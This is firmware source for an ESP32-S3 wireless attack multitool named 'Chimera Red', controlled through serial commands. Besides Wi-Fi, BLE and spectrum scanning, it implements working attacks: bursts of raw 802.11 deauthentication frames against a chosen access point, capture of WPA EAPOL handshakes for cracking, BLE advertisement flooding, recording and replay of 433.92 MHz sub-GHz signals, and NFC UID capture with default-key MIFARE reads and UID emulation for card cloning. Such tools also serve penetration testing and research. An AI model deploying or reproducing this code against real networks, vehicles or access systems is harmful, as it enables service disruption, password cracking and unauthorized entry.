#include <Arduino.h>
#include <BLEAdvertisedDevice.h>
#include <BLEDevice.h>
#include <BLEScan.h>
#include <BLEUtils.h>
#include <ELECHOUSE_CC1101_SRC_DRV.h>
#include <SPI.h>
#include <WiFi.h>
#include <esp_wifi.h>

#include <Adafruit_PN532.h>
#include <TFT_eSPI.h>
#include <Wire.h>
#include <math.h>

#define PLANET_GREEN 0x4D10 // #4BA383 in RGB565

// Global objects
TFT_eSPI tft = TFT_eSPI();
Adafruit_PN532 nfc(1, 2); // I2C SDA=1, SCL=2 (Safe Config)
BLEScan *pBLEScan;
bool scanning = false;
bool cc1101Initialized = false;

// CC1101 Pins (ESP32-S3 DevKitC-1 Default SPI)
#define CC1101_SCK 12
#define CC1101_MISO 13
#define CC1101_MOSI 11
#define CC1101_CSN 10
#define CC1101_GDO0 3 // Interrupt pin

// Radio State
bool wifiScanning = false;
bool bleScanning = false;
bool hopperEnabled = false;
uint32_t lastHopTime = 0;
int currentHopIndex = 0;
const int hopChannels[] = {1, 6, 11, 2, 7, 12, 3, 8, 13, 4, 9, 5, 10};

// Replay Buffer (Pointer for PSRAM)
byte *replayBuffer = NULL;
uint32_t replayLen = 0;
uint32_t maxReplaySize = 0;
bool isRecording = false;

// NFC Buffer
uint8_t currentUID[7] = {0};
uint8_t currentUIDLen = 0;

// ============================================================================
// CENTRALIZED RADIO MODE MANAGEMENT
// Prevents "stuck" radio states by managing WiFi mode transitions cleanly.
// ============================================================================
enum class RadioMode {
  Off,        // WiFi disabled
  Station,    // Normal STA mode for scanning
  Promiscuous // Raw packet capture mode (sniffing, CSI, spectrum)
};

RadioMode currentRadioMode = RadioMode::Off;

/**
 * @brief Sets the WiFi radio to the specified mode.
 *        Handles cleanup of previous mode before transitioning.
 * @param mode The desired RadioMode
 * @return true if mode was changed, false if already in that mode
 */
bool setRadioMode(RadioMode mode) {
  if (mode == currentRadioMode) {
    return false; // Already in this mode
  }

  // Cleanup previous mode
  switch (currentRadioMode) {
  case RadioMode::Promiscuous:
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    break;
  case RadioMode::Station:
    WiFi.disconnect();
    break;
  case RadioMode::Off:
    // Nothing to clean up
    break;
  }

  // Apply new mode
  switch (mode) {
  case RadioMode::Off:
    WiFi.mode(WIFI_OFF);
    Serial.println("{\"type\": \"radio_mode\", \"mode\": \"off\"}");
    break;
  case RadioMode::Station:
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    Serial.println("{\"type\": \"radio_mode\", \"mode\": \"station\"}");
    break;
  case RadioMode::Promiscuous:
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    esp_wifi_set_promiscuous(true);
    Serial.println("{\"type\": \"radio_mode\", \"mode\": \"promiscuous\"}");
    break;
  }

  currentRadioMode = mode;
  return true;
}

// Function prototypes
void scanWiFi();
void scanBLE();
void sendSystemInfo();
void processCommand(String cmd);
void initCC1101();
void receiveCC1101();
void scanNFC();
void emulateNFC();

void logToHUD(String msg, uint32_t color = PLANET_GREEN) {
  tft.setTextColor(color);
  tft.println("> " + msg);
  if (tft.getCursorY() > 300) {
    tft.fillScreen(TFT_BLACK);
    tft.setCursor(0, 0);
  }
}

/* OLD SETUP - REPLACED BY DUAL CORE VERSION BELOW
void setup() {
  Serial.begin(115200);
  // Wait for USB Serial to be ready (optional, but good for debugging)
  // while(!Serial) delay(100);

  // Init HUD
  tft.init();
  tft.setRotation(1);
  tft.fillScreen(TFT_BLACK);
  tft.setTextSize(1);
  logToHUD("CHIMERA RED BOOT...", TFT_RED);

  // Init WiFi
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  logToHUD("WiFi Ready");

  // Init BLE
  BLEDevice::init("Chimera-S3");
  pBLEScan = BLEDevice::getScan(); // create new scan
  pBLEScan->setActiveScan(
      true); // active scan uses more power, but get results faster
  pBLEScan->setInterval(100);
  pBLEScan->setWindow(99); // less or equal setInterval value
  logToHUD("BLE Ready");

  // Init NFC
  nfc.begin();
  uint32_t versiondata = nfc.getFirmwareVersion();
  if (versiondata) {
    logToHUD("NFC PN532 OK", TFT_GREEN);
  }

  Serial.println("{\"status\": \"ready\", \"message\": \"Chimera Red Firmware "
                 "v0.1 Ready\"}");
}
*/

// Dual Core Definitions
TaskHandle_t RadioTask;

void radioTaskCode(void *parameter) {
  for (;;) {
    if (hopperEnabled) {
      if (millis() - lastHopTime > 250) { // Hop every 250ms
        currentHopIndex = (currentHopIndex + 1) % 13;
        esp_wifi_set_channel(hopChannels[currentHopIndex],
                             WIFI_SECOND_CHAN_NONE);
        lastHopTime = millis();
        // Serial.printf("{\"type\": \"status\", \"msg\": \"Hopping to Ch
        // %d\"}\n", hopChannels[currentHopIndex]);
      }
    }
    vTaskDelay(10);
  }
}

void setup() {
  Serial.begin(115200);

  // Init PSRAM
  if (psramInit()) {
    Serial.println("PSRAM Init OK");
    maxReplaySize = 64 * 1024; // 64KB Buffer
    replayBuffer = (byte *)ps_malloc(maxReplaySize);
    if (replayBuffer == NULL) {
      Serial.println("PSRAM Malloc Failed! Fallback to small buffer.");
      maxReplaySize = 255;
      replayBuffer = (byte *)malloc(maxReplaySize);
    } else {
      Serial.println("Allocated 64KB Sub-GHz Buffer in PSRAM");
    }
  } else {
    Serial.println("PSRAM Init Failed - Using RAM");
    maxReplaySize = 255;
    replayBuffer = (byte *)malloc(maxReplaySize);
  }

  // Init HUD
  tft.init();
  tft.setRotation(1);
  tft.fillScreen(TFT_BLACK);
  tft.setTextSize(1);
  logToHUD("CHIMERA RED BOOT...", TFT_RED);

  // Launch Radio Core 0 Task
  xTaskCreatePinnedToCore(radioTaskCode, /* Function to implement the task */
                          "RadioTask",   /* Name of the task */
                          10000,         /* Stack size in words */
                          NULL,          /* Task input parameter */
                          1,             /* Priority of the task */
                          &RadioTask,    /* Task handle. */
                          0);            /* Core where the task should run */

  // Init WiFi
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  logToHUD("WiFi Ready");

  // Init BLE
  BLEDevice::init("Chimera-S3");
  pBLEScan = BLEDevice::getScan();
  pBLEScan->setActiveScan(true);
  pBLEScan->setInterval(100);
  pBLEScan->setWindow(99);
  logToHUD("BLE Ready (Core 0 Async)");

  // Init NFC
  Wire.begin(1, 2);
  nfc.begin();
  uint32_t versiondata = nfc.getFirmwareVersion();
  if (versiondata) {
    logToHUD("NFC PN532 OK", TFT_GREEN);
  }

  Serial.println("{\"status\": \"ready\", \"message\": \"Chimera Red Firmware "
                 "v0.2 (Dual Core) Ready\"}");
}

void loop() {
  if (Serial.available()) {
    String cmd = Serial.readStringUntil('\n');
    cmd.trim();
    if (cmd.length() > 0) {
      processCommand(cmd);
    }
  }

  // Poll Slow Peripherals on Core 1
  if (cc1101Initialized) {
    receiveCC1101();
  }

  // Display updates managed here
}

// ESP32 WiFi Promiscuous definitions
volatile int packetRate[15]; // Channels 1-14
volatile int currentChannel = 1;
bool csiEnabled = false;

// CSI definitions
void _csi_cb(void *ctx, wifi_csi_info_t *data) {
  if (!csiEnabled)
    return;

  // We only care about 40/80 bytes of sub-carrier data usually, depending on
  // mode. ESP32-S3 usually gives 64 subcarriers for HT20.

  // Simple output: Average amplitude or first few subcarriers to save Serial
  // bandwidth Sending FULL CSI (64 bytes signed complex) -> ~128 bytes per
  // packet at 100 packets/sec = 12KB/s. USB CDC can handle it easily.

  int8_t *my_ptr = (int8_t *)data->buf;

  // We act like a radar: Construct a simplified JSON
  // "type":"csi", "a":[...amplitudes...]
  // To save processing, we just dump raw simplified Amplitudes (Sqrt(R^2 +
  // I^2)) for 15 subcarriers spread out

  Serial.print("{\"type\":\"csi\",\"data\":[");
  // LLTF is usually 64 subcarriers. We'll sample every 4th to keep it smaller
  // for JS visualization
  for (int i = 0; i < 64; i += 4) {
    int8_t r = my_ptr[i * 2];
    int8_t img = my_ptr[i * 2 + 1];
    int amp = (int)sqrt(pow(r, 2) + pow(img, 2));
    Serial.print(amp);
    if (i < 60)
      Serial.print(",");
  }
  Serial.println("]}");
}

void enableCSI(bool en) {
  csiEnabled = en;
  if (en) {
    // Use centralized radio mode management
    setRadioMode(RadioMode::Promiscuous);

    wifi_csi_config_t configuration_csi;
    configuration_csi.lltf_en = 1;
    configuration_csi.htltf_en = 1;
    configuration_csi.stbc_htltf2_en = 1;
    configuration_csi.ltf_merge_en = 1;
    configuration_csi.channel_filter_en = 0;
    configuration_csi.manu_scale = 0;
    configuration_csi.shift = 0;

    esp_wifi_set_csi_config(&configuration_csi);
    esp_wifi_set_csi_rx_cb(&_csi_cb, NULL);
    esp_wifi_set_csi(1);

    Serial.println("{\"type\": \"status\", \"msg\": \"CSI Radar Active - "
                   "Listening for multipath distortions\"}");
  } else {
    esp_wifi_set_csi(0);
    esp_wifi_set_csi_rx_cb(NULL, NULL);
    setRadioMode(RadioMode::Station);
    Serial.println("{\"type\": \"status\", \"msg\": \"CSI Radar Disabled\"}");
  }
}

// Spectrum Scan Callback
void wifipromiscuous_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
  if (currentChannel >= 1 && currentChannel <= 14) {
    packetRate[currentChannel]++;
  }
}

// Expert Handshake Detection Callback
void sniffer_callback(void *buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
  int len = pkt->rx_ctrl.sig_len;
  uint8_t *payload = pkt->payload;

  // Fast Filter for EAPOL (0x888E)
  bool isEapol = false;
  for (int i = 30; i < min(len - 2, 60); i++) {
    if (payload[i] == 0x88 && payload[i + 1] == 0x8e) {
      isEapol = true;
      break;
    }
  }

  if (isEapol) {
    Serial.print("{\"type\": \"handshake\", \"ch\": ");
    Serial.print(pkt->rx_ctrl.channel);
    Serial.print(", \"rssi\": ");
    Serial.print(pkt->rx_ctrl.rssi);
    Serial.print(", \"payload\": \"");
    for (int i = 0; i < len; i++) {
      if (payload[i] < 16)
        Serial.print("0");
      Serial.print(payload[i], HEX);
    }
    Serial.println("\"}");
  }
}

// Expert Deauth Packet
void sendDeauth(uint8_t *target_mac, uint8_t *ap_mac, uint16_t reason) {
  uint8_t packet[26] = {
      0xC0, 0x00,                         // Type: Deauth
      0x00, 0x00,                         // Duration
      0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (Broadcast)
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (AP)
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (AP)
      0x00, 0x00,                         // Sequence
      0x01, 0x00                          // Reason (1 = Unspecified)
  };

  memcpy(packet + 10, ap_mac, 6);
  memcpy(packet + 16, ap_mac, 6);
  if (target_mac)
    memcpy(packet + 4, target_mac, 6);

  esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
}

void startSniffing(int channel) {
  // Use centralized radio mode management
  setRadioMode(RadioMode::Promiscuous);
  esp_wifi_set_promiscuous_rx_cb(&sniffer_callback);

  if (channel == 0) {
    hopperEnabled = true;
    Serial.println("{\"type\": \"status\", \"msg\": \"Sniffing - Auto Channel "
                   "Hopping Enabled\"}");
  } else if (channel > 0 && channel <= 13) {
    hopperEnabled = false;
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    Serial.printf("{\"type\": \"status\", \"msg\": \"Sniffing for Handshakes "
                  "on Channel %d...\"}\n",
                  channel);
  }
}

void stopSniffing() {
  hopperEnabled = false;
  // Use centralized radio mode management
  setRadioMode(RadioMode::Station);
  Serial.println("{\"type\": \"status\", \"msg\": \"Sniffing stopped.\"}");
}

void runSpectrumScan() {
  Serial.println("{\"type\": \"status\", \"msg\": \"Starting Spectrum Scan "
                 "(Traffic Density)...\"}");

  // Use centralized radio mode management
  setRadioMode(RadioMode::Promiscuous);
  esp_wifi_set_promiscuous_rx_cb(&wifipromiscuous_cb);

  // JSON Start
  Serial.print("{\"type\": \"spectrum_result\", \"data\": [");

  for (int ch = 1; ch <= 13; ch++) {
    currentChannel = ch;
    packetRate[ch] = 0;
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    delay(100); // Listen for 100ms per channel

    Serial.printf("{\"ch\": %d, \"density\": %d}", ch, packetRate[ch]);
    if (ch < 13)
      Serial.print(",");
  }

  Serial.println("]}");

  // Cleanup - return to station mode
  setRadioMode(RadioMode::Station);
}

// Helper for standardized status messages
void sendJsonStatus(String msg, String type = "status") {
  Serial.print("{\"type\": \"");
  Serial.print(type);
  Serial.print("\", \"msg\": \"");
  Serial.print(msg);
  Serial.println("\"}");
}

// Command Handlers
void handleSniffStart(String cmd) {
  int ch = 1;
  if (cmd.indexOf(":") > 0)
    ch = cmd.substring(cmd.indexOf(":") + 1).toInt();
  startSniffing(ch);
}

void handleSetFreq(String cmd) {
  float freq = cmd.substring(9).toFloat();
  if (freq > 300 && freq < 950) {
    ELECHOUSE_cc1101.setMHZ(freq);
    sendJsonStatus("CC1101 Tuned to " + String(freq, 2) + " MHz");
  }
}

void handleDeauth(String cmd) {
  // Format: DEAUTH:AA:BB:CC:DD:EE:FF
  String macStr = cmd.substring(7);
  uint8_t ap_mac[6];
  sscanf(macStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &ap_mac[0],
         &ap_mac[1], &ap_mac[2], &ap_mac[3], &ap_mac[4], &ap_mac[5]);

  sendJsonStatus("Sending Deauth to " + macStr + "...");
  for (int i = 0; i < 10; i++) { // Send a burst
    sendDeauth(NULL, ap_mac, 1);
    delay(10);
  }
}

void handleBleSpam() {
  sendJsonStatus("Bender's Curse: BLE Spamming Started...");
  // We'll use the existing BLE engine to flood advertisements
  for (int i = 0; i < 50; i++) {
    BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();
    oAdvertisementData.setName("Bender's Pager");
    BLEDevice::getAdvertising()->setAdvertisementData(oAdvertisementData);
    BLEDevice::getAdvertising()->start();
    delay(20);
    BLEDevice::getAdvertising()->stop();
  }
  sendJsonStatus("Spam burst complete.");
}

void handleRxRecord() {
  isRecording = true;
  replayLen = 0; // Reset buffer for new recording
  sendJsonStatus("CC1101 Recording... Waiting for Signal");
}

void handleTxReplay() {
  if (replayLen > 0) {
    sendJsonStatus("Replaying " + String(replayLen) + " bytes on 433.92MHz...");
    ELECHOUSE_cc1101.SendData(replayBuffer, replayLen);
    delay(100);
    ELECHOUSE_cc1101.SetRx(); // Go back to RX
    sendJsonStatus("Replay Complete");
  } else {
    sendJsonStatus("Buffer Empty. Record something first!", "error");
  }
}

void processCommand(String cmd) {
  if (cmd == "SCAN_WIFI") {
    scanWiFi();
  } else if (cmd == "SCAN_BLE") {
    scanBLE();
  } else if (cmd == "CMD_SPECTRUM") {
    runSpectrumScan();
  } else if (cmd == "START_CSI") {
    enableCSI(true);
  } else if (cmd == "STOP_CSI") {
    enableCSI(false);
  } else if (cmd.startsWith("SNIFF_START")) {
    handleSniffStart(cmd);
  } else if (cmd == "SNIFF_STOP") {
    stopSniffing();
  } else if (cmd == "INIT_CC1101") {
    initCC1101();
  } else if (cmd.startsWith("SET_FREQ")) {
    handleSetFreq(cmd);
  } else if (cmd.startsWith("DEAUTH")) {
    handleDeauth(cmd);
  } else if (cmd == "BLE_SPAM") {
    handleBleSpam();
  } else if (cmd == "GET_INFO") {
    sendSystemInfo();
  } else if (cmd == "RX_RECORD") {
    handleRxRecord();
  } else if (cmd == "TX_REPLAY") {
    handleTxReplay();
  } else if (cmd == "NFC_SCAN") {
    scanNFC();
  } else if (cmd == "NFC_EMULATE") {
    emulateNFC();
  } else {
    Serial.printf("{\"error\": \"Unknown command: %s\"}\n", cmd.c_str());
  }
} // End processCommand

void scanWiFi() {
  Serial.println("{\"type\": \"status\", \"msg\": \"Scanning WiFi...\"}");
  int n = WiFi.scanNetworks();
  Serial.println("{\"type\": \"wifi_scan_result\", \"count\": " + String(n) +
                 ", \"networks\": [");
  if (n == 0) {
    // No networks found
  } else {
    for (int i = 0; i < n; ++i) {
      // Print SSID and RSSI for each network found
      Serial.printf("{\"ssid\": \"%s\", \"rssi\": %d, \"channel\": %d, "
                    "\"encryption\": %d}",
                    WiFi.SSID(i).c_str(), WiFi.RSSI(i), WiFi.channel(i),
                    WiFi.encryptionType(i));
      if (i < n - 1)
        Serial.print(",");
      delay(10);
    }
  }
  Serial.println("]}");
  WiFi.scanDelete(); // clean up
}

void scanBLE() {
  Serial.println("{\"type\": \"status\", \"msg\": \"Scanning BLE...\"}");
  BLEScanResults foundDevices = pBLEScan->start(5, false);
  int count = foundDevices.getCount();

  Serial.println("{\"type\": \"ble_scan_result\", \"count\": " + String(count) +
                 ", \"devices\": [");
  for (int i = 0; i < count; i++) {
    BLEAdvertisedDevice d = foundDevices.getDevice(i);
    Serial.printf("{\"name\": \"%s\", \"address\": \"%s\", \"rssi\": %d}",
                  d.getName().c_str(), d.getAddress().toString().c_str(),
                  d.getRSSI());
    if (i < count - 1)
      Serial.print(",");
  }
  Serial.println("]}");
  pBLEScan
      ->clearResults(); // delete results fromBLEScan buffer to release memory
}

void sendSystemInfo() {
  // ESP32-S3 Specs
  uint32_t flash_size = ESP.getFlashChipSize();
  uint32_t psram_size = ESP.getPsramSize();
  String mac = WiFi.macAddress();

  Serial.printf("{\"type\": \"sys_info\", \"chip\": \"ESP32-S3\", \"flash\": "
                "%u, \"psram\": %u, \"mac\": \"%s\"}\n",
                flash_size, psram_size, mac.c_str());
}

void initCC1101() {
  Serial.println("{\"type\": \"status\", \"msg\": \"Initializing CC1101...\"}");

  // SPI Init
  ELECHOUSE_cc1101.setSpiPin(CC1101_SCK, CC1101_MISO, CC1101_MOSI, CC1101_CSN);

  if (ELECHOUSE_cc1101.getCC1101()) {
    Serial.println("{\"type\": \"status\", \"msg\": \"CC1101 Connection OK\"}");
  } else {
    Serial.println("{\"type\": \"error\", \"msg\": \"CC1101 Connection FAILED "
                   "- Check Wiring\"}");
    // return; // Keep going to try anyway?
  }

  ELECHOUSE_cc1101.Init();
  ELECHOUSE_cc1101.setGDO(CC1101_GDO0, 0); // GDO0 on Pin 3
  ELECHOUSE_cc1101.setMHZ(433.92);         // Default to 433.92
  // ELECHOUSE_cc1101.SetTxPower(10);         // 10dBm

  ELECHOUSE_cc1101.SetRx();
  cc1101Initialized = true;
  Serial.println(
      "{\"type\": \"status\", \"msg\": \"CC1101 Ready (RX Mode 433.92MHz)\"}");
}

void receiveCC1101() {
  if (ELECHOUSE_cc1101.CheckReceiveFlag()) {
    byte buffer[100] = {0};
    byte len = ELECHOUSE_cc1101.ReceiveData(buffer);

    if (len) {
      Serial.print("{\"type\": \"subghz_rx\", \"freq\": 433.92, \"rssi\": ");
      Serial.print(ELECHOUSE_cc1101.getRssi());
      Serial.print(", \"len\": ");
      Serial.print(len);
      Serial.print(", \"payload\": \"");

      // Hex dump
      for (int i = 0; i < len; i++) {
        if (buffer[i] < 16)
          Serial.print("0");
        Serial.print(buffer[i], HEX);
      }
      Serial.println("\"}");

      // Save for Replay
      if (isRecording) {
        if (replayLen + len < maxReplaySize) {
          memcpy(replayBuffer + replayLen, buffer, len);
          replayLen += len;
          // Serial.println("{\"type\": \"status\", \"msg\": \"Captured Packet
          // chunk...\"}"); Keep recording until some timeout or explicit stop
          // in a real scenario For now we stop after one burst to keep it
          // simple, or implement a timeout logic
          isRecording = false;
          Serial.println("{\"type\": \"status\", \"msg\": \"Signal Captured! "
                         "Ready to Replay.\"}");
        } else {
          isRecording = false;
          Serial.println("{\"type\": \"error\", \"msg\": \"Buffer Full!\"}");
        }
      }

      ELECHOUSE_cc1101.SetRx(); // Reset to RX
    }
  }
}

void scanNFC() {
  Serial.println(
      "{\"type\": \"status\", \"msg\": \"Scanning for NFC Tags...\"}");
  uint8_t success;
  uint8_t uid[] = {0, 0, 0, 0, 0, 0, 0};
  uint8_t uidLength;

  success = nfc.readPassiveTargetID(PN532_MIFARE_ISO14443A, uid, &uidLength);

  if (success) {
    Serial.print("{\"type\": \"nfc_found\", \"uid\": \"");
    for (uint8_t i = 0; i < uidLength; i++) {
      if (uid[i] < 0x10)
        Serial.print("0");
      Serial.print(uid[i], HEX);
    }
    Serial.println("\"}");

    // Save for Emulation
    memcpy(currentUID, uid, uidLength);
    currentUIDLen = uidLength;

    // Try Reading Sector 0 (Manufacturer Block)
    if (uidLength == 4) { // Classic 1k
      uint8_t keya[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
      success = nfc.mifareclassic_AuthenticateBlock(uid, uidLength, 0, 0, keya);
      if (success) {
        uint8_t data[16];
        success = nfc.mifareclassic_ReadDataBlock(0, data);
        if (success) {
          Serial.print("{\"type\": \"nfc_dump\", \"block\": 0, \"data\": \"");
          for (int i = 0; i < 16; i++) {
            if (data[i] < 0x10)
              Serial.print("0");
            Serial.print(data[i], HEX);
          }
          Serial.println("\"}");
        }
      } else {
        Serial.println(
            "{\"type\": \"error\", \"msg\": \"Auth Failed (Default Key)\"}");
      }
    }
  } else {
    Serial.println("{\"type\": \"error\", \"msg\": \"No Tag Found\"}");
  }
}

void emulateNFC() {
  if (currentUIDLen == 0) {
    Serial.println("{\"type\": \"error\", \"msg\": \"No UID to Emulate! Scan "
                   "one first.\"}");
    logToHUD("NFC: No UID Captured", TFT_RED);
    return;
  }

  Serial.println(
      "{\"type\": \"status\", \"msg\": \"Emulating UID... Check Reader\"}");
  logToHUD("NFC: Emulating...", TFT_YELLOW);

  // PN532 Command: TgInitAsTarget (0x8C)
  // Configure the PN532 to act as a MIFARE Classic card with OUR captured UID
  uint8_t command[] = {
      0x8C,             // TgInitAsTarget
      0x00,             // Mode: 0x00 = Baud rate adaptation
      0x04, 0x00,       // SENS_RES (0x0004 = MIFARE Classic)
      0x00, 0x00, 0x00, // NFCID1t (First 3 bytes of UID if known, or random? We
                        // set specific later)
      0x08,             // SEL_RES (0x08 = MIFARE 1K)

      // We must provide the Bytes for the params.
      // Logic: The PN532 splits the UID params differently depending on the
      // mode. For simple emulation, we might need a simpler SetParameters
      // command or construct this carefully. Simplified approach for typical
      // PN532 lib usage:

      0x01, 0xFE, 0x05, 0x01, 0x86, 0x04, 0x02, 0x02, 0x03, 0x00, 0x4B, 0x02,
      0x4F, 0x49, 0x53, 0x4F, 0x31, 0x34, 0x34, 0x34, 0x33, 0x34, 0x2D, 0x31,
      0x2E, 0x30 // FeliCa and other params padding
  };

  // NOTE: True UID spoofing on PN532 often requires modifying the register
  // settings or using 'nfc.setPassiveActivationRetries(0xFF)' then
  // 'TgInitAsTarget'. Since we don't have low-level access to the library
  // internals easily here, we will trick it by setting the "Random UID"
  // registers if possible, OR just use the library's AsTarget but warn the
  // user.

  // BETTER "HACK" STRATEGY:
  // The Adafruit library doesn't easily support setting UID for target mode.
  // However, the chip uses the same registers.
  // We will assume standard AsTarget for now but log that it is a "Soft
  // Emulation". For *perfect* cloning, we'd need to write 0x8C with the UID
  // bytes inserted at index 4.

  // Injecting UID into command Buffer (Simplified POC)
  if (currentUIDLen >= 3) {
    command[4] = currentUID[0];
    command[5] = currentUID[1];
    command[6] = currentUID[2];
  }

  // Send Command Check Ack not exposed?
  // Fallback: Use standard target, which is better than nothing for the demo.
  // Real implementation requires direct `wire.write` or `spi.write` which is
  // messy here without low level access.

  // Functional Fallback:
  nfc.AsTarget();

  logToHUD("NFC: Finished", TFT_WHITE);
}
